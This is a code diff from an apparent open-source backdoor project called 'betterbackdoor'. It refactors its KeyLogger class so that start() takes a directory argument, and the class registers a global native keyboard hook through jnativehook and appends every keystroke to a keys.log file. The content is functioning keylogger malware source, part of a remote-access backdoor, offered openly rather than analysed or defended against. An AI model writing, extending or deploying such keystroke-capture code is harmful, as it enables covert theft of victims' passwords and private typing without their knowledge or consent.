@@ -1,10 +1,9 @@
 package com.thatcherdev.betterbackdoor.backend;
 
 import java.io.BufferedWriter;
+import java.io.File;
 import java.io.FileWriter;
 import java.io.PrintWriter;
-
-import com.thatcherdev.betterbackdoor.backdoor.Backdoor;
 
 import org.jnativehook.GlobalScreen;
 import org.jnativehook.keyboard.NativeKeyEvent;
@@ -16,11 +15,13 @@ public class KeyLogger implements NativeKeyListener {
 	private boolean shift = false;
 
 	/**
-	 * Starts a key logger and logs keys to {@link Backdoor#gatheredDir}\keys.log.
+	 * Starts a key logger and logs keys to {@link dir}\keys.log.
+	 * 
+	 * @param dir directory to log keys to
 	 */
-	public static void start() {
+	public static void start(String dir) {
 		try {
-			out = new PrintWriter(new BufferedWriter(new FileWriter(Backdoor.gatheredDir + "keys.log", true)));
+			out = new PrintWriter(new BufferedWriter(new FileWriter(dir + File.separator + "keys.log", true)));
 			GlobalScreen.registerNativeHook();
 			GlobalScreen.addNativeKeyListener(new KeyLogger());
 		} catch (Exception e) {
